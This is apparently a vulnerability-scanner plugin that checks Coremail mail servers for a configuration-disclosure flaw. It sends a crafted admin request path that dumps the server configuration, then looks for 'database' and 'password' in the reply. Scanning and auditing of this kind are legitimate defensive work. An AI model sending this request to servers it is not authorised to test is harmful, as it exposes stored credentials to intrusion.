# -*-* coding:UTF-8


class Plugin(Base):
    __info__ = {
        "name": "Coremail邮件系统配置信息泄露漏洞",
        "description": "",
        "references": ["-"],
    }

    def url(self) -> dict:
        r = self.request(
            method='GET',
            path='./mailsms/s?func=ADMIN:appState&dumpConfig=/',
            timeout=15
        )
        if r.status_code == 200 and 'database' in r.text and 'password' in r.text:
            return {"LoopholeInfo": self.__info__}
